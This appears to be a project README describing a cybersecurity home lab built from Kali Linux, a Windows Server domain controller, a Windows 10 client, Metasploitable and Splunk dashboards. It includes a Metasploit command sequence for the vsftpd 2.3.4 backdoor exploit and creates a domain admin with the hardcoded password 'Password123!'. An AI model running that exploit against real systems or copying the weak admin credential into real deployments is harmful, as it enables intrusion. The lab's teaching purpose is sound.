# Cybersecurity Home Lab Setup

## Overview

This project demonstrates the setup of a professional cybersecurity home lab environment using Kali Linux, Windows Server, Windows 10, and Metasploitable. This lab allows for practical experimentation with penetration testing, vulnerability assessments, and threat detection using Splunk, making it an excellent showcase for cybersecurity skills.

## Objectives

- Set up a realistic cybersecurity lab environment with multiple virtual machines.
- Use Kali Linux for penetration testing and ethical hacking practices.
- Configure Windows Server to manage a domain, DNS, and secure the environment.
- Deploy Windows 10 as a domain-joined client for endpoint security testing.
- Use Metasploitable as a deliberately vulnerable machine for exploit testing.
- Visualize security events through custom Splunk dashboards for real-time monitoring.

## Lab Components

- **Kali Linux**: The primary attack machine loaded with tools like Metasploit, Nmap, and Wireshark.
- **Windows Server**: Configured as a domain controller with Active Directory and DNS.
- **Windows 10**: A client machine for testing endpoint security within a domain environment.
- **Metasploitable**: A vulnerable machine used for testing exploits and attacks.

## Setup Guide

### 1. Environment Preparation

#### VMware Workstation Installation
1. Download and install VMware Workstation Pro or VirtualBox from their official websites.
2. Enable **VT-x** or **AMD-V** in the BIOS to support virtualization.

### 2. Kali Linux Setup

#### Step-by-Step Configuration
1. **Create a VM** in VMware or VirtualBox:
   - Name: **Kali Linux**
   - Type: **Linux, Debian 64-bit**
   - Resources: 4 GB RAM, 2 CPUs, 40 GB disk space.
2. **Install Kali Linux** using the downloaded ISO file:
   - Use the default guided partitioning settings during installation.
   - Set a strong root password during setup.

#### Post-Installation Commands
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install open-vm-tools-desktop -y  # Installs VMware tools for improved performance

3. Windows Server Setup
PowerShell Commands for Setup

    Install Active Directory:

----powershell

Install-WindowsFeature -Name AD-Domain-Services
Install-ADDSForest -DomainName "lab.local"

Create Domain Users and Groups:

----powershell

    New-ADUser -Name "TestUser" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
    Add-ADGroupMember -Identity "Domain Admins" -Members "TestUser"

4. Windows 10 Setup
Join Windows 10 to Domain

    Create a VM in VMware or VirtualBox:
        Name: Windows 10
        Resources: 4 GB RAM, 1 CPU, 40 GB disk space.
    Install Windows 10 from the ISO and configure network settings to match the serverâ€™s domain.

----powershell

    Add-Computer -DomainName "lab.local" -Credential (Get-Credential)
    Restart-Computer

5. Metasploitable Setup

    Import Metasploitable VM into VMware:
        Configure the VM to run in an isolated network environment to avoid exposing vulnerabilities.
    Test Connectivity with Kali Linux to ensure it is reachable.

6. Splunk Dashboards
Setting Up Splunk Dashboards

    Create Splunk Dashboards to visualize security events.
    Use Advanced Queries for specific event monitoring:

    spl

    index=main source="WinEventLog:Security" EventCode=4625
    | stats count by Account_Name, ComputerName, IpAddress
    | sort - count

7. Advanced Testing Scenarios
Penetration Testing with Metasploit

----bash
  
    msfconsole
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST <Metasploitable_IP>
    exploit

Hardening Windows Server

----powershell

    # Disable SMBv1 to enhance security
    Set-SmbServerConfiguration -EnableSMB1Protocol $false
